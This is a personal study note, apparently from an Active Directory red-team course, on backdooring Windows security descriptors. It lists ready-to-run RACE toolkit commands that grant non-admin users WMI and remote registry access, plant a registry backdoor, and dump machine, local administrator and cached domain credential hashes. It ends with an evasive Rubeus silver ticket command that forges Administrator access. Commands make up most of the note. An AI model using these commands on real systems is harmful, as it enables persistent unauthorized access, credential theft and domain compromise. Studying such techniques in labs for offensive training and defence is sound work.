Remote ACLs can be modified to allow for users without administrative access to remote
- PowerShell remoting
- WMI
- remote registry

can simply modify the SID in the ACL
![[assets/Pasted image 20260205041548.png]]

# WMI

unstable after Augus 2020 patches

Using the RACE toolkit
`C:\AD\Tools\RACE-master\RACE.ps1`

on a local machine for user
`Set-RemoteWMI -SamAccountName <user> -Verbose`

one remote machine for user without explicit credentials
`Set-RemoteWMI -SamAccountName <user> -ComputerName <hostname> -Credential Administrator -namespace 'root\cimv2' -Verbose`

one remote machine remove permissions
`Set-RemoteWMI -SamAccountName <user> -ComputerName <hostname> -namespace 'root\cimv2' -Remove -Verbose`


when connecting to WMI, two ACLs are checked
- DCOM - a way to connect to remote machines - explanation out of scope for CRTP
- WMI


# Remote Registry

backdoor using RACE or DAMP, with admin privs on remote machine
`Add-RemoteRegBackdoor -ComputerName <hostname> -Trustee <user> -Verbose`


as a user, retrieve the machine account hash
`Get-RemoteMachineAccountHash -ComputerName <DOMAIN> -Verbose`
- can create a silver ticket -> if it's a DC, you can access any resources


retrieve the local administrator hash
`Get-RemoteLocalAccountHash -ComputerName <DOMAIN> -Verbose`


retrieve domain cached credentials
`Get-RemoteCachedCredential -ComputerName <DOMAIN> -Verbose`



# Learning Objective

### Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access

once you get remote access on a remote machine (I don't think it has to be DC, since you need admin privs to do it and it wouldn't make sense to do this if you were already DA)
`Add-RemoteRegBackdoor -ComputerName <hostname> -Trustee <user> -Verbose`




### Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI

with the Registry backdoor set, run the following
`Get-RemoteMachineAccountHash -ComputerName <hostname> -Verbose`

run normal silver ticket commands
`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:<SPN> /rc4:<machine_hash> /sid:S-1-5-... /ldap /user:Administrator /domain:<DOMAIN> /ptt`